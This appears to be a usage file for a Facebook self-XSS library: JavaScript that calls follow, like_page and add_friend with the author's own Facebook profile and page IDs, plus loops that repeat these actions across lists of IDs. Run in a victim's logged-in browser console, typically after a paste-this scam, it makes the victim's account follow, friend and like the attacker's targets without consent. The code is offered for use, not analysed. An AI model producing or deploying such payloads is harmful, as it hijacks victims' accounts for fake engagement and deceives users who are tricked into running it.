// include selfxss-function.js

// Basic Usage

// follow a facebook profile
follow(100007033009377);  // my facebook user_id

// like a facebook page
like_page(739225052783955); // my facebook page_id

// add facebook profile as a friend
add_friend(100007033009377); // my facebook user_id

// advance functions

// follow all listed facebook accounts
function follow_all(ids){
  for(f = 0; f < ids.length; f++){
    follow(ids[f]);
  }
}
follow_all([4, 100007033009377, 6]);

// like all listed facebook pages
function like_page_all(ids){
  for(f = 0; f < ids.length; f++){
    like_page(ids[f]);
  }
}
like_page_all([18947194, 12498589185, 3838383883]);

// add all listed facebook profile as a friend
function add_friend_all(ids){
  for(f = 0; f < ids.length; f++){
    add_friend(ids[f]);
  }
}
add_friend_all([4, 100007033009377, 6]);
